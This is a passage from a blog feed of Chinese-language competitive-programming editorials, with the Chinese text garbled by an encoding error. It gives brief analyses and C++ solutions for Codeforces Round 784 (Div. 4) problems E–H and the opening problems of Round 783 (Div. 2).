class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">3000</span>;</span><br><span class="line"><span class="keyword">int</span> a[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">5</span>];</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">        a[((s[<span class="number">0</span>]-<span class="string">&#x27;a&#x27;</span>)&lt;&lt;<span class="number">8</span>)|(s[<span class="number">1</span>]-<span class="string">&#x27;a&#x27;</span>)]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>( (i&amp;<span class="number">0x0000ff00</span>)==(j&amp;<span class="number">0x0000ff00</span>)||(i&amp;<span class="number">0x000000ff</span>)==(j&amp;<span class="number">0x000000ff</span>) )&#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]&amp;&amp;a[j])&#123;</span><br><span class="line">                    ans+=<span class="number">1ll</span>*a[i]*a[j];</span><br><span class="line">                    <span class="comment">//printf(&quot;0x%x 0x%x\n&quot;,i,j);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,a[0x101]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Eating-Candies"><a href="#F-Eating-Candies" class="headerlink" title="F. Eating Candies"></a>F. Eating Candies</h2><h3 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/6.png" alt="6"></p><h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯ä¸€ä¸ªäººåªèƒ½ä»å·¦åƒï¼Œå¦ä¸€ä¸ªäººåªèƒ½ä»å³å¼€å§‹åƒï¼Œé—®æœ€ååƒçš„é‡é‡ä¸€æ ·çš„æƒ…å†µä¸‹çš„æœ€å¤šç³–æœã€‚è¿™ä¸ªç›´æ¥è´ªå¿ƒå¥½äº†ï¼Œå¦‚æœå·¦è¾¹äººå°‘äº†é‚£å°±å·¦è¾¹çš„äººåƒï¼Œå¦åˆ™å³è¾¹çš„äººåƒï¼Œä¸€æ—¦é‡é‡ä¸€æ ·äº†ä¿å­˜ç»“æœï¼Œæœ€åè¾“å‡ºå³å¯ã€‚</p><h3 id="æ ‡ç¨‹-5"><a href="#æ ‡ç¨‹-5" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>;</span><br><span class="line"><span class="keyword">int</span> w[N+<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>,j=n;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=j)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==b)&#123;</span><br><span class="line">            ans=i<span class="number">-1</span>+n-j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a&lt;b)&#123;</span><br><span class="line">            a+=w[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            b+=w[j];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a==b)ans=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="G-Fall-Down"><a href="#G-Fall-Down" class="headerlink" title="G. Fall Down"></a>G. Fall Down</h2><h3 id="é¢˜ç›®æè¿°-6"><a href="#é¢˜ç›®æè¿°-6" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/7.png" alt="7"></p><h3 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æ¨¡æ‹Ÿé¢˜ï¼Œç›´æ¥æŒ‰è¦æ±‚ä¸‹è½çŸ³å—å°±è¡Œï¼Œæ³¨æ„åˆ¤æ–­ä¸€ä¸‹ä¸‹è½æ¡ä»¶å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-6"><a href="#æ ‡ç¨‹-6" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fall</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">//a[y++][x];</span></span><br><span class="line">    <span class="keyword">while</span>(y!=n&amp;&amp;a[y+<span class="number">1</span>][x]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        y++;</span><br><span class="line">        a[y][x]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            a[i][j]=s[j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">fall</span>(j,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Maximal-AND"><a href="#H-Maximal-AND" class="headerlink" title="H. Maximal AND"></a>H. Maximal AND</h2><h3 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/8.png" alt="8"></p><h3 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æœ‰kæ¬¡æœºä¼šè®©æŸä¸€ä¸ªæ•°çš„äºŒè¿›åˆ¶ä½å˜æˆ1ï¼Œæœ€åæ±‚æ‰€æœ‰æ•°çš„ä¸æœ€å¤§å€¼ã€‚æˆ‘ä»¬ç›´æ¥ç»Ÿè®¡æ‰€æœ‰ä½çš„æƒ…å†µï¼Œä»æœ€é«˜ä½å¼€å§‹ï¼Œå¦‚æœå½“å‰kçš„å€¼å…è®¸å˜ä¸ºå…¨1åˆ™ç›´æ¥ç»™äº†ï¼Œç„¶åç­”æ¡ˆåŠ ä¸Šé‚£ä¸€ä½å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-7"><a href="#æ ‡ç¨‹-7" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">60</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_bit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            a[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="built_in">get_bit</span>(x);</span><br><span class="line">        <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">30</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=n-a[i])&#123;</span><br><span class="line">            k-=n-a[i];</span><br><span class="line">            ans|=(<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡åœ¨cfä¸Šakï¼Œä¹Ÿç®—æˆåŠŸå§ï¼Œè™½ç„¶éƒ½æŒºç®€å•çš„hhhã€‚</p><p><img src="/2022/04/22/Codeforces%20Round%20784(Div.4)/9.png" alt="9"></p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> ç­¾åˆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 783(Div.2)è§£æ</title>
      <link href="/2022/04/20/Codeforces%20Round%20783(Div.2)/"/>
      <url>/2022/04/20/Codeforces%20Round%20783(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1668">Codeforces Round #783 (Div. 2)</a></p><span id="more"></span><h2 id="A-Direction-Change"><a href="#A-Direction-Change" class="headerlink" title="A. Direction Change"></a>A. Direction Change</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ä¸éš¾å‘ç°ï¼Œæˆ‘æœ€ä¼˜çš„è·¯çº¿åªèƒ½æ˜¯å‘å³æˆ–è€…å‘ä¸‹èµ°ã€‚æˆ‘å…ˆä¸å¦¨è®¾ $m\ge n$ï¼Œå¦‚æœèµ°åˆ°åº•äº†ï¼Œä¸å¾—ä»¥æˆ‘åªèƒ½å‘ä¸Šè½¬å˜æ–¹å‘ç„¶åå†å³ä¸‹ï¼Œè¿™æ ·å¾ªç¯èµ°ç›´åˆ°ç»ˆç‚¹ï¼Œåªè€ƒè™‘åˆ°äº†æœ€åä¸€è¡Œçš„æƒ…å†µï¼Œä¸éš¾å‘ç°ï¼Œæ¯æ¬¡é•¿åº¦+1å˜ä¸ºå¥‡æ•°æ—¶ï¼Œèµ°çš„æ­¥æ•°+1ï¼Œå¦åˆ™+3ã€‚æœ€åç‰¹åˆ¤ä¸€ä¸‹èµ°ä¸äº†çš„æƒ…å†µï¼Œå½“åªæœ‰ä¸€è¡Œä¸”æœ‰è¶…è¿‡2åˆ—çš„æƒ…å†µä¸ºèµ°ä¸äº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">if</span>(n&gt;m)&#123;<span class="comment">//m&gt;n</span></span><br><span class="line">        <span class="built_in">swap</span>(n,m);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>&amp;&amp;m&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    ans+=<span class="number">2</span>*n<span class="number">-2</span>;</span><br><span class="line">    m-=n;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">        ans+=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=<span class="number">2</span>*m<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Social-Distance"><a href="#B-Social-Distance" class="headerlink" title="B.Social Distance"></a>B.Social Distance</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/20/Codeforces%20Round%20783(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>nä¸ªäººè¦åšåœ¨mæŠŠæ¤…å­ä¸Šï¼Œæ¯ä¸ªäººå¯¹è‡ªå·±æœ‰è¦æ±‚ï¼Œè¦æ±‚å·¦å³ä¸¤è¾¹å¿…é¡»æœ‰ä¸€å®šæ•°ç›®æŠŠç©ºæ¤…å­ã€‚è¿™ä¸ªäº¤é”™ä¸¤å‘ï¼Œåé¢å‘ç°è¿™äº›äººä¸æ˜¯æŒ‰é¡ºåºåçš„ï¼Œå¯ä»¥éšæ„æ’ï¼Œé‚£ä¹ˆä¸éš¾å‘ç°æˆ‘ä»¬å¯ä»¥å¯¹è¦æ±‚ä»å°åˆ°å¤§æ’åºç„¶åç›¸é‚»ä¹‹é—´çš„è¦æ±‚å–maxæœ€åå–å’Œå¾—åˆ°ä¸€ä¸ªå€¼ä¸mæ¯”è¾ƒå³å¯ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000006</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span 